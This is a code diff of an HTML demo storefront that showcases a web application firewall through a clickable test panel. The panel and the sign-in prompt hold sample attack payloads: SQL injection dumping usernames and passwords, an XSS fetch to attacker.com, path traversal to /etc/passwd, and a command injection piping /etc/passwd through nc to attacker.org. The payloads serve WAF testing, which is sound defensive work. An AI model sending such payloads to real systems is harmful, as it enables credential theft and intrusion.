@@ -3,148 +3,421 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apex Store | Protected by WireFall WAF</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <title>Apex Tech Store | Modern Electronics & Cloud Gear</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         :root {
-            --bg-main: #0b0f19;
-            --panel-bg: #111827;
-            --border: #1f2937;
-            --cf-orange: #f97316;
-            --text-white: #f8fafc;
-            --text-muted: #94a3b8;
+            --bg-body: #f8fafc;
+            --bg-card: #ffffff;
+            --border: #e2e8f0;
+            --primary: #2563eb;
+            --primary-hover: #1d4ed8;
+            --text-dark: #0f172a;
+            --text-muted: #64748b;
+            --accent-green: #10b981;
+            --accent-red: #ef4444;
         }
+
+        * { box-sizing: border-box; }
 
         body {
             font-family: 'Inter', sans-serif;
-            background-color: var(--bg-main);
-            color: var(--text-white);
+            background-color: var(--bg-body);
+            color: var(--text-dark);
             margin: 0;
             padding: 0;
         }
 
-        header {
-            background: var(--panel-bg);
-            border-bottom: 1px solid var(--border);
-            padding: 1rem 2rem;
+        /* Top Notification Bar */
+        .top-banner {
+            background: linear-gradient(90deg, #1e293b, #0f172a);
+            color: #f8fafc;
+            padding: 0.5rem 2rem;
+            font-size: 0.85rem;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
 
-        .waf-badge {
-            background: rgba(249, 115, 22, 0.15);
-            border: 1px solid var(--cf-orange);
-            color: var(--cf-orange);
-            padding: 0.3rem 0.75rem;
+        .waf-status-badge {
+            background: rgba(37, 99, 235, 0.2);
+            border: 1px solid #3b82f6;
+            color: #60a5fa;
+            padding: 0.2rem 0.6rem;
             border-radius: 9999px;
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             font-weight: 700;
-            text-transform: uppercase;
         }
 
-        .container {
-            max-width: 1000px;
-            margin: 2rem auto;
-            padding: 0 1rem;
-        }
-
-        .card {
-            background: var(--panel-bg);
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 2rem;
-            margin-bottom: 2rem;
-        }
-
-        h2 { font-size: 1.25rem; margin-top: 0; display: flex; align-items: center; gap: 0.5rem; }
-
-        .search-box {
+        /* Main Header Navigation */
+        header {
+            background: var(--bg-card);
+            border-bottom: 1px solid var(--border);
+            padding: 1rem 2rem;
             display: flex;
-            gap: 0.75rem;
-            margin-top: 1rem;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
         }
 
-        input {
-            flex: 1;
-            background: #05070d;
+        .brand {
+            font-size: 1.35rem;
+            font-weight: 800;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            text-decoration: none;
+        }
+
+        .search-form {
+            display: flex;
+            width: 450px;
+            position: relative;
+        }
+
+        .search-input {
+            width: 100%;
+            padding: 0.65rem 1rem 0.65rem 2.5rem;
             border: 1px solid var(--border);
-            color: #fff;
-            padding: 0.85rem 1rem;
             border-radius: 8px;
-            font-size: 0.95rem;
+            font-size: 0.9rem;
+            outline: none;
+            transition: all 0.2s;
         }
 
-        button {
-            background: var(--cf-orange);
-            color: #fff;
-            border: none;
-            padding: 0.85rem 1.5rem;
-            border-radius: 8px;
-            font-weight: 700;
-            cursor: pointer;
+        .search-input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
         }
 
-        button:hover { background: #ea580c; }
-
-        .exploit-hints {
-            margin-top: 1.5rem;
-            background: #05070d;
-            border: 1px dashed var(--border);
-            padding: 1rem;
-            border-radius: 8px;
-            font-size: 0.85rem;
+        .search-icon {
+            position: absolute;
+            left: 0.85rem;
+            top: 50%;
+            transform: translateY(-50%);
             color: var(--text-muted);
         }
 
-        .exploit-hints code {
-            color: var(--cf-orange);
-            font-family: monospace;
-            cursor: pointer;
-            text-decoration: underline;
+        .nav-actions {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
         }
+
+        .btn-nav {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text-dark);
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 0.85rem;
+            cursor: pointer;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .btn-primary {
+            background: var(--primary);
+            color: #ffffff;
+            border: none;
+        }
+
+        .btn-primary:hover { background: var(--primary-hover); }
+
+        /* Container Layout */
+        .container {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 0 1.5rem;
+        }
+
+        .hero {
+            background: linear-gradient(135deg, #1e3a8a, #2563eb);
+            color: #ffffff;
+            border-radius: 16px;
+            padding: 3rem;
+            margin-bottom: 2.5rem;
+            box-shadow: 0 10px 25px -5px rgba(37, 99, 235, 0.3);
+        }
+
+        .hero h1 { font-size: 2.25rem; font-weight: 800; margin: 0 0 0.75rem 0; }
+        .hero p { font-size: 1.1rem; opacity: 0.9; margin: 0; max-width: 600px; }
+
+        /* Product Grid */
+        .grid-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .grid-header h2 { font-size: 1.35rem; font-weight: 700; margin: 0; }
+
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 1.5rem;
+        }
+
+        .product-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.25rem;
+            transition: transform 0.2s, box-shadow 0.2s;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .product-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 12px 20px -5px rgba(0,0,0,0.08);
+        }
+
+        .product-img-holder {
+            height: 150px;
+            background: #f1f5f9;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary);
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+
+        .product-title { font-weight: 700; font-size: 1.05rem; margin-bottom: 0.4rem; }
+        .product-desc { color: var(--text-muted); font-size: 0.85rem; margin-bottom: 1rem; flex: 1; }
+        .product-footer { display: flex; justify-content: space-between; align-items: center; }
+        .product-price { font-weight: 800; font-size: 1.15rem; color: var(--text-dark); }
+
+        /* Exploit Test Floating Sidebar */
+        .test-box {
+            background: #ffffff;
+            border: 2px dashed #cbd5e1;
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-top: 3rem;
+        }
+
+        .test-box h3 { margin-top: 0; font-size: 1.1rem; color: #1e293b; display: flex; align-items: center; gap: 0.5rem; }
+        .test-chips { display: flex; flex-wrap: wrap; gap: 0.5rem; margin-top: 1rem; }
+        .chip {
+            background: #f1f5f9;
+            border: 1px solid #cbd5e1;
+            padding: 0.4rem 0.8rem;
+            border-radius: 6px;
+            font-size: 0.8rem;
+            font-family: 'Fira Code', monospace;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+
+        .chip:hover { background: #e2e8f0; border-color: var(--primary); }
+        .chip.danger { background: #fef2f2; border-color: #fca5a5; color: #dc2626; }
+        .chip.danger:hover { background: #fee2e2; }
+
+        /* Result Alert Modal/Banner */
+        #resultBanner {
+            display: none;
+            padding: 1rem 1.5rem;
+            border-radius: 8px;
+            margin-bottom: 1.5rem;
+            font-size: 0.95rem;
+            font-weight: 600;
+        }
+
+        #resultBanner.success { background: #ecfdf5; border: 1px solid #10b981; color: #065f46; }
+        #resultBanner.blocked { background: #fef2f2; border: 1px solid #ef4444; color: #991b1b; }
     </style>
 </head>
 <body>
 
-    <header>
-        <div style="font-weight: 800; font-size: 1.2rem;">
-            🛒 Apex Retail Store
+    <!-- Top Info Bar -->
+    <div class="top-banner">
+        <div>
+            <span>⚡ Welcome to Apex Tech Store</span>
+            <span style="opacity: 0.6; margin: 0 0.5rem;">|</span>
+            <span style="opacity: 0.85;">Free Next-Day Delivery on orders over $50</span>
         </div>
-        <div class="waf-badge">
-            <i class="fas fa-shield-halved"></i> WireFall WAF Active
+        <div style="display: flex; align-items: center; gap: 1rem;">
+            <div class="waf-status-badge">
+                <i class="fas fa-shield-halved"></i> WireFall WAF Protected
+            </div>
+            <a href="/dashboard/" style="color: #60a5fa; text-decoration: none; font-weight: 600;">Monitor Dashboard &rarr;</a>
+        </div>
+    </div>
+
+    <!-- Main Navigation Header -->
+    <header>
+        <a href="/app/" class="brand">
+            <i class="fas fa-microchip"></i> Apex Tech
+        </a>
+
+        <form onsubmit="executeSearch(event)" class="search-form">
+            <i class="fas fa-search search-icon"></i>
+            <input type="text" id="searchInput" class="search-input" placeholder="Search laptops, headphones, smartwatches..." name="query">
+        </form>
+
+        <div class="nav-actions">
+            <a href="/dashboard/" class="btn-nav">
+                <i class="fas fa-chart-line"></i> Dashboard
+            </a>
+            <button onclick="openLoginModal()" class="btn-nav btn-primary">
+                <i class="fas fa-user"></i> Sign In
+            </button>
         </div>
     </header>
 
     <div class="container">
-        <div class="card">
-            <h2><i class="fas fa-search" style="color: var(--cf-orange);"></i> Search Catalog (Protected Form)</h2>
-            <p style="color: var(--text-muted); font-size: 0.9rem;">Test searching for products or try sending an attack payload through WireFall WAF:</p>
-            
-            <form action="/app/search" method="GET" class="search-box">
-                <input type="text" name="query" id="queryInput" placeholder="Enter product search query...">
-                <button type="submit">Search Catalog</button>
-            </form>
+        <!-- Live Interception Alert Banner -->
+        <div id="resultBanner"></div>
 
-            <div class="exploit-hints">
-                <b>💡 Try clicking these test queries:</b>
-                <ul>
-                    <li>Benign Query: <code onclick="setQuery('wireless noise canceling headphones')">wireless noise canceling headphones</code></li>
-                    <li>SQL Injection Attack: <code onclick="setQuery('admin\' UNION SELECT 1, username, password FROM users--')">admin' UNION SELECT 1, username, password FROM users--</code></li>
-                    <li>XSS Attack Payload: <code onclick="setQuery('<script>fetch(\'http://attacker.com/steal\')</script>')">&lt;script&gt;fetch('http://attacker.com/steal')&lt;/script&gt;</code></li>
-                </ul>
+        <!-- Hero Section -->
+        <div class="hero">
+            <h1>Next-Gen Tech & Cloud Hardware</h1>
+            <p>Explore high-performance laptops, noise-canceling audio, and developer workstations protected live by WireFall WAF.</p>
+        </div>
+
+        <!-- Products Section -->
+        <div class="grid-header">
+            <h2>Featured Electronics</h2>
+            <span style="color: var(--text-muted); font-size: 0.9rem;" id="productCount">Showing 4 Products</span>
+        </div>
+
+        <div class="products-grid" id="productsGrid">
+            <div class="product-card">
+                <div>
+                    <div class="product-img-holder"><i class="fas fa-laptop"></i></div>
+                    <div class="product-title">ProBook Ultra 16"</div>
+                    <div class="product-desc">Apple M3 Max Equivalent, 32GB RAM, 1TB NVMe SSD Workstation.</div>
+                </div>
+                <div class="product-footer">
+                    <div class="product-price">$1,899</div>
+                    <button class="btn-nav btn-primary" onclick="addToCart('ProBook Ultra 16')">Add to Cart</button>
+                </div>
+            </div>
+
+            <div class="product-card">
+                <div>
+                    <div class="product-img-holder"><i class="fas fa-headphones"></i></div>
+                    <div class="product-title">SonicPro ANC Headphones</div>
+                    <div class="product-desc">Active Noise Cancellation, 40-hour Battery Life, Spatial Audio.</div>
+                </div>
+                <div class="product-footer">
+                    <div class="product-price">$299</div>
+                    <button class="btn-nav btn-primary" onclick="addToCart('SonicPro ANC')">Add to Cart</button>
+                </div>
+            </div>
+
+            <div class="product-card">
+                <div>
+                    <div class="product-img-holder"><i class="fas fa-keyboard"></i></div>
+                    <div class="product-title">Apex Mechanical Keyboard</div>
+                    <div class="product-desc">Hot-swappable tactile switches, RGB per-key lighting, Wireless.</div>
+                </div>
+                <div class="product-footer">
+                    <div class="product-price">$149</div>
+                    <button class="btn-nav btn-primary" onclick="addToCart('Apex Keyboard')">Add to Cart</button>
+                </div>
+            </div>
+
+            <div class="product-card">
+                <div>
+                    <div class="product-img-holder"><i class="fas fa-clock"></i></div>
+                    <div class="product-title">Chronos Smart Watch 4</div>
+                    <div class="product-desc">AMOLED display, ECG sensor, GPS tracking, 7-day battery.</div>
+                </div>
+                <div class="product-footer">
+                    <div class="product-price">$249</div>
+                    <button class="btn-nav btn-primary" onclick="addToCart('Chronos Watch')">Add to Cart</button>
+                </div>
             </div>
         </div>
 
-        <div style="text-align: center; color: var(--text-muted); font-size: 0.85rem;">
-            <a href="/dashboard/" style="color: var(--cf-orange); text-decoration: none; font-weight: 700;">View Live WAF Monitor Dashboard &rarr;</a>
+        <!-- Interactive WAF Test Station -->
+        <div class="test-box">
+            <h3><i class="fas fa-vial" style="color: var(--primary);"></i> WAF Live Interception Simulator</h3>
+            <p style="color: var(--text-muted); font-size: 0.85rem; margin: 0.25rem 0 1rem 0;">
+                Click any query below to test how WireFall WAF handles real user requests vs malicious attack payloads:
+            </p>
+            <div class="test-chips">
+                <div class="chip" onclick="testPayload('query=wireless+headphones')">
+                    <i class="fas fa-check-circle" style="color: var(--accent-green);"></i> Benign: wireless headphones
+                </div>
+                <div class="chip" onclick="testPayload('query=probook+laptop')">
+                    <i class="fas fa-check-circle" style="color: var(--accent-green);"></i> Benign: probook laptop
+                </div>
+                <div class="chip danger" onclick="testPayload('query=admin\' UNION SELECT 1, username, password FROM users--')">
+                    <i class="fas fa-shield-virus"></i> SQLi: admin' UNION SELECT 1, username, password FROM users--
+                </div>
+                <div class="chip danger" onclick="testPayload('query=<script>fetch(\'http://attacker.com/steal\')</script>')">
+                    <i class="fas fa-shield-virus"></i> XSS: &lt;script&gt;fetch('http://attacker.com/steal')&lt;/script&gt;
+                </div>
+                <div class="chip danger" onclick="testPayload('query=../../../../etc/passwd')">
+                    <i class="fas fa-shield-virus"></i> Path Traversal: ../../../../etc/passwd
+                </div>
+                <div class="chip danger" onclick="testPayload('target=127.0.0.1; cat /etc/passwd | nc attacker.org 1337')">
+                    <i class="fas fa-shield-virus"></i> RCE Payload: target=127.0.0.1; cat /etc/passwd...
+                </div>
+            </div>
         </div>
     </div>
 
     <script>
-        function setQuery(text) {
-            document.getElementById("queryInput").value = text;
+        async function executeSearch(event) {
+            if (event) event.preventDefault();
+            const val = document.getElementById("searchInput").value;
+            testPayload("query=" + encodeURIComponent(val));
+        }
+
+        async function testPayload(queryString) {
+            const banner = document.getElementById("resultBanner");
+            banner.style.display = "block";
+            banner.className = "";
+            banner.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting request through OpenResty WAF...';
+
+            try {
+                const response = await fetch("/app/search?" + queryString, {
+                    method: "GET",
+                    headers: { "Accept": "text/html,application/json" }
+                });
+
+                if (response.status === 200) {
+                    banner.className = "success";
+                    banner.innerHTML = `✅ <b>200 OK — Passed WireFall WAF Cleanly</b><br><span style="font-size:0.85rem; font-weight:normal;">Request passed all security layers. Activity logged to Dashboard.</span>`;
+                } else if (response.status === 403) {
+                    banner.className = "blocked";
+                    banner.innerHTML = `🛡️ <b>403 FORBIDDEN — Intercepted by WireFall WAF</b><br><span style="font-size:0.85rem; font-weight:normal;">Malicious payload detected and blocked instantly. Threat event logged to Dashboard & MongoDB.</span>`;
+                } else {
+                    banner.className = "blocked";
+                    banner.innerHTML = `⚠️ <b>HTTP ${response.status}</b> — Response received.`;
+                }
+            } catch (err) {
+                banner.className = "blocked";
+                banner.innerHTML = `⚠️ Connection error: ` + err.message;
+            }
+        }
+
+        function addToCart(item) {
+            const banner = document.getElementById("resultBanner");
+            banner.style.display = "block";
+            banner.className = "success";
+            banner.innerHTML = `🛒 Added <b>${item}</b> to your cart!`;
+            setTimeout(() => { banner.style.display = "none"; }, 3000);
+        }
+
+        function openLoginModal() {
+            const payload = prompt("Enter username to sign in (or try SQLi attack):", "admin' OR '1'='1");
+            if (payload) {
+                testPayload("query=" + encodeURIComponent(payload));
+            }
         }
     </script>
 </body>
